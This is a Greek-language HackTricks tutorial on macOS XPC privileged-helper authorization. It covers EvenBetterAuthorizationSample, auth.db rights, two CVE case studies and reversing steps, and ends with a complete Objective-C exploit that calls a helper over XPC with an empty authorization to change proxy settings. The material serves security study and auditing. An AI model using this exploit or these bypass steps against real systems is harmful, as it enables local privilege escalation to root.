# macOS XPC Εξουσιοδότηση

{{#include ../../../../../banners/hacktricks-training.md}}

## Εξουσιοδότηση XPC

Η Apple προτείνει επίσης έναν άλλο τρόπο αυθεντικοποίησης εάν η συνδεόμενη διεργασία έχει **δικαιώματα να καλέσει μια εκτεθειμένη μέθοδο XPC**.

Όταν μια εφαρμογή χρειάζεται να **εκτελέσει ενέργειες ως χρήστης με προνόμια**, αντί να εκτελείται η εφαρμογή ως τέτοιος χρήστης, συνήθως εγκαθιστά ως root ένα HelperTool ως υπηρεσία XPC που μπορεί να κληθεί από την εφαρμογή για να εκτελέσει αυτές τις ενέργειες. Ωστόσο, η εφαρμογή που καλεί την υπηρεσία θα πρέπει να έχει επαρκή εξουσιοδότηση.

### ShouldAcceptNewConnection πάντα YES

Ένα παράδειγμα βρίσκεται στο [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Στο `App/AppDelegate.m` προσπαθεί να **συνδεθεί** με το **HelperTool**. Και στο `HelperTool/HelperTool.m` η συνάρτηση **`shouldAcceptNewConnection`** **δεν θα ελέγξει** κανένα από τα απαιτούμενα που αναφέρθηκαν νωρίτερα. Θα επιστρέψει πάντα YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Για περισσότερες πληροφορίες σχετικά με τον σωστό τρόπο διαμόρφωσης αυτού του ελέγχου:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Δικαιώματα εφαρμογής

Ωστόσο, υπάρχει κάποια **authorization όταν καλείται μια μέθοδος από το HelperTool**.

Η συνάρτηση **`applicationDidFinishLaunching`** από `App/AppDelegate.m` θα δημιουργήσει μια κενή authorization reference μετά την εκκίνηση της εφαρμογής. Αυτό θα πρέπει πάντα να λειτουργεί.\
Στη συνέχεια, θα προσπαθήσει να **add some rights** σε αυτήν την authorization reference καλώντας `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Η συνάρτηση `setupAuthorizationRights` από `Common/Common.m` θα αποθηκεύσει στην auth database `/var/db/auth.db` τα rights της εφαρμογής. Σημειώστε πώς θα προσθέσει μόνο τα rights που δεν υπάρχουν ακόμη στη βάση δεδομένων:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Η συνάρτηση `enumerateRightsUsingBlock` είναι αυτή που χρησιμοποιείται για να πάρει τα δικαιώματα των εφαρμογών, τα οποία ορίζονται σε `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Αυτό σημαίνει ότι στο τέλος αυτής της διαδικασίας, τα δικαιώματα που δηλώνονται μέσα στο `commandInfo` θα αποθηκευτούν στο `/var/db/auth.db`. Σημείωσε πώς εκεί μπορείς να βρεις για **κάθε μέθοδο** που θα **απαιτήσει έλεγχο ταυτότητας**, **όνομα δικαιώματος** και το **`kCommandKeyAuthRightDefault`**. Το τελευταίο **υποδεικνύει ποιος μπορεί να αποκτήσει αυτό το δικαίωμα**.

Υπάρχουν διαφορετικές εμβέλειες για να υποδείξουν ποιος μπορεί να έχει πρόσβαση σε ένα δικαίωμα. Μερικά από αυτά ορίζονται στο [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), αλλά ως περίληψη:

<table><thead><tr><th width="284.3333333333333">Όνομα</th><th width="165">Value</th><th>Περιγραφή</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Οποιοσδήποτε</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Κανένας</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Ο τρέχων χρήστης πρέπει να είναι admin (μέλος της ομάδας admin)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Ζητά από τον χρήστη να πιστοποιηθεί.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Ζητά από τον χρήστη να πιστοποιηθεί. Πρέπει να είναι admin (μέλος της ομάδας admin)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Καθορισμός κανόνων</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Καθορισμός επιπλέον σχολίων για το δικαίωμα</td></tr></tbody></table>

### Rights Verification

In `HelperTool/HelperTool.m` the function **`readLicenseKeyAuthorization`** checks if the caller is authorized to **εκτελέσει αυτήν τη μέθοδο** calling the function **`checkAuthorization`**. This function will check the **authData** sent by the calling process has a **correct format** and then will check **τί απαιτείται για να αποκτηθεί το δικαίωμα** to call the specific method. If all goes good the **returned `error` will be `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Σημειώστε ότι για να **ελεγχθούν οι προϋποθέσεις για να αποκτήσει το δικαίωμα** να καλέσει αυτή τη μέθοδο, η συνάρτηση `authorizationRightForCommand` θα ελέγξει απλώς το αντικείμενο που αναφέρθηκε προηγουμένως **`commandInfo`**. Έπειτα, θα καλέσει **`AuthorizationCopyRights`** για να ελέγξει **εάν έχει τα δικαιώματα** να καλέσει τη συνάρτηση (σημειώστε ότι τα flags επιτρέπουν αλληλεπίδραση με τον χρήστη).

Σε αυτή την περίπτωση, για να κληθεί η συνάρτηση `readLicenseKeyAuthorization`, το `kCommandKeyAuthRightDefault` έχει οριστεί σε `@kAuthorizationRuleClassAllow`. Έτσι **οποιοσδήποτε μπορεί να την καλέσει**.

### Πληροφορίες DB

Αναφέρθηκε ότι αυτές οι πληροφορίες αποθηκεύονται στο `/var/db/auth.db`. Μπορείτε να απαριθμήσετε όλους τους αποθηκευμένους κανόνες με:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Έπειτα, μπορείτε να δείτε ποιος μπορεί να έχει πρόσβαση στο δικαίωμα με:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Χαλαρά δικαιώματα

Μπορείτε να βρείτε **όλες τις ρυθμίσεις δικαιωμάτων** [**in here**](https://www.dssw.co.uk/reference/authorization-rights/), αλλά οι συνδυασμοί που δεν θα απαιτούν αλληλεπίδραση του χρήστη είναι οι εξής:

1. **'authenticate-user': 'false'**
- Αυτό είναι το πιο άμεσο κλειδί. Αν οριστεί σε `false`, υποδεικνύει ότι ένας χρήστης δεν χρειάζεται να παράσχει αυθεντικοποίηση για να αποκτήσει αυτό το δικαίωμα.
- Αυτό χρησιμοποιείται σε **συνδυασμό με ένα από τα 2 παρακάτω ή για να υποδείξει μια ομάδα** στην οποία πρέπει να ανήκει ο χρήστης.
2. **'allow-root': 'true'**
- Εάν ένας χρήστης λειτουργεί ως root user (ο οποίος έχει αυξημένα δικαιώματα), και αυτό το κλειδί είναι ορισμένο σε `true`, ο root user θα μπορούσε ενδεχομένως να αποκτήσει αυτό το δικαίωμα χωρίς περαιτέρω αυθεντικοποίηση. Ωστόσο, συνήθως η απόκτηση κατάστασης root απαιτεί ήδη αυθεντικοποίηση, οπότε αυτό δεν αποτελεί σενάριο «χωρίς αυθεντικοποίηση» για τους περισσότερους χρήστες.
3. **'session-owner': 'true'**
- Αν οριστεί σε `true`, ο κάτοχος της συνεδρίας (ο τρέχοντα συνδεδεμένος χρήστης) θα λάβει αυτόματα αυτό το δικαίωμα. Αυτό μπορεί να παρακάμψει επιπλέον αυθεντικοποίηση αν ο χρήστης είναι ήδη συνδεδεμένος.
4. **'shared': 'true'**
- Αυτό το κλειδί δεν χορηγεί δικαιώματα χωρίς αυθεντικοποίηση. Αντίθετα, αν οριστεί σε `true`, σημαίνει ότι μόλις το δικαίωμα έχει αυθεντικοποιηθεί, μπορεί να μοιραστεί ανάμεσα σε πολλαπλές διεργασίες χωρίς κάθε μία να χρειάζεται να επαληθευτεί ξανά. Όμως η αρχική χορήγηση του δικαιώματος εξακολουθεί να απαιτεί αυθεντικοποίηση εκτός αν συνδυαστεί με άλλα κλειδιά όπως `'authenticate-user': 'false'`.

Μπορείτε [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) για να αποκτήσετε τα ενδιαφέροντα δικαιώματα:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Μελέτες περίπτωσης παράκαμψης εξουσιοδότησης

- **CVE-2024-4395 – Jamf Compliance Editor helper**: Η εκτέλεση ενός audit τοποθετεί το `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, εκθέτει την υπηρεσία Mach `com.jamf.complianceeditor.helper`, και εξάγει το `-executeScriptAt:arguments:then:` χωρίς να επαληθεύει το `AuthorizationExternalForm` του καλούντος ή την υπογραφή του κώδικα. Ένα απλό exploit καλεί `AuthorizationCreate` για να δημιουργήσει κενή αναφορά, συνδέεται με `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]`, και καλεί τη μέθοδο για να εκτελέσει αυθαίρετα δυαδικά ως root. Πλήρεις σημειώσεις αντιστροφής (συμπεριλαμβανομένου PoC) στο [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 and 7.4.0–7.4.2 δέχτηκαν crafted XPC μηνύματα που έφταναν σε privileged helper χωρίς μηχανισμούς ελέγχου εξουσιοδότησης. Επειδή ο helper εμπιστευόταν το δικό του privileged `AuthorizationRef`, οποιοσδήποτε τοπικός χρήστης που μπορούσε να στείλει μήνυμα στην υπηρεσία μπορούσε να τον εξαναγκάσει να εκτελέσει αυθαίρετες αλλαγές ρυθμίσεων ή εντολές ως root. Λεπτομέρειες στο [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### Γρήγορες συμβουλές για ταχεία αξιολόγηση

- Όταν μια εφαρμογή συνοδεύεται τόσο από GUI όσο και από helper, κάνε diff στις απαιτήσεις υπογραφής κώδικα τους και έλεγξε εάν το `shouldAcceptNewConnection` κλειδώνει τον listener με `-setCodeSigningRequirement:` (ή επικυρώνει το `SecCodeCopySigningInformation`). Η έλλειψη ελέγχων συνήθως οδηγεί σε σενάρια CWE-863 όπως στην περίπτωση Jamf. Μια γρήγορη ματιά φαίνεται ως εξής:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Συγκρίνετε τι *νομίζει* ότι εξουσιοδοτεί το helper με όσα παρέχει ο client. Κατά το reversing, διακόψτε στην `AuthorizationCopyRights` και επιβεβαιώστε ότι το `AuthorizationRef` προέρχεται από `AuthorizationCreateFromExternalForm` (παρασχεμένο από τον client) αντί του προνομιακού περιβάλλοντος του helper — αλλιώς πιθανότατα βρήκατε ένα μοτίβο CWE-863 παρόμοιο με τα παραπάνω.

## Αντίστροφη μηχανική εξουσιοδότησης

### Checking if EvenBetterAuthorization is used

Αν βρείτε τη συνάρτηση: **`[HelperTool checkAuthorization:command:]`** πιθανότατα η διαδικασία χρησιμοποιεί το προαναφερθέν σχήμα για εξουσιοδότηση:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Σε αυτήν την περίπτωση, αν αυτή η συνάρτηση καλεί συναρτήσεις όπως `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, τότε χρησιμοποιεί [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Ελέγξτε το **`/var/db/auth.db`** για να δείτε αν είναι δυνατό να αποκτήσετε δικαιώματα για να καλέσετε κάποια προνομιακή ενέργεια χωρίς αλληλεπίδραση με τον χρήστη.

### Επικοινωνία πρωτοκόλλου

Στη συνέχεια, πρέπει να βρείτε το σχήμα του πρωτοκόλλου για να μπορέσετε να καθιερώσετε επικοινωνία με την υπηρεσία XPC.

Η συνάρτηση **`shouldAcceptNewConnection`** υποδεικνύει το πρωτόκολλο που εξάγεται:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

Σε αυτή την περίπτωση, έχουμε το ίδιο με το EvenBetterAuthorizationSample, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Γνωρίζοντας το όνομα του πρωτοκόλλου που χρησιμοποιείται, είναι δυνατό να **dump its header definition** με:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Τέλος, χρειαζόμαστε μόνο το **όνομα της εκτεθειμένης Mach Service** για να δημιουργήσουμε επικοινωνία μαζί της. Υπάρχουν διάφοροι τρόποι για να το εντοπίσετε:

- Στο **`[HelperTool init]`** όπου μπορείτε να δείτε τη Mach Service να χρησιμοποιείται:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- Στο launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Example

Σε αυτό το παράδειγμα δημιουργούνται:

- Ο ορισμός του πρωτοκόλλου με τις συναρτήσεις
- Ένα κενό auth για να χρησιμοποιηθεί για να ζητηθεί πρόσβαση
- Μια σύνδεση στην υπηρεσία XPC
- Μια κλήση στη συνάρτηση αν η σύνδεση ήταν επιτυχής
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Άλλοι XPC privilege helpers που καταχράστηκαν

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Αναφορές

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)

{{#include ../../../../../banners/hacktricks-training.md}}
